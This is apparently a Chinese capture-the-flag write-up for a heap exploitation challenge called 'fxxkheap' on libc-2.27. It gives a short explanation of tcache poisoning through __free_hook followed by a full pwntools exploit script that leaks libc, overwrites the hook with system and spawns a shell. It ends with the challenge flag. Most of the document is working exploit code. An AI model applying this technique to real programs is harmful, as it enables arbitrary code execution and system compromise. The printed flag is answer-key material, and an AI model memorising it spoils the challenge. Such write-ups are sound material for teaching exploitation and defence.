| 题目名称 | fxxkheap  |
| -------- | --------- |
| 题目类型 | PWN       |
| 题目说明 | libc-2.27 |

简单的libc-2.27的堆题，gift功能给出puts的真实地址，不管是使用UAF还是堆溢出修改一个被释放的tcache的fd位到free_hook,在申请2次申请到free_hook处，修改成system函数的地址，最后释放一个写有```/bin/sh```的堆块即可getshell。

exp：

```python
# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64')
context.log_level = 'debug'
libc = ELF('./libc-2.27.so')

local = 1
if local:
    p = process("./pwn")
else:
    p = remote("","")


def cmd(i):
    p.sendlineafter("Your choice: ",str(i))

def add(size,data):
    cmd(1)
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

def free(idx):
    cmd(2)
    p.sendlineafter("Idx:",str(idx))

def edit(idx,size,data):
    cmd(3)
    p.sendlineafter("Idx:",str(idx))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

cmd(4)
p.recvuntil("[puts_addr]==> ")
puts_addr = int(p.recv(14),16)
print hex(puts_addr)
libc_base = puts_addr - libc.sym['puts']
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

add(0x70,"aaa")#0
add(0x70,"/bin/sh")#1
free(0)
edit(0,0x70,p64(free_hook))
add(0x70,"aaa")#0
add(0x70,p64(system_addr))

free(1)

# gdb.attach(p)
p.interactive()
```

#MOCSCTF{H3ap_1s_s0_eAsY}
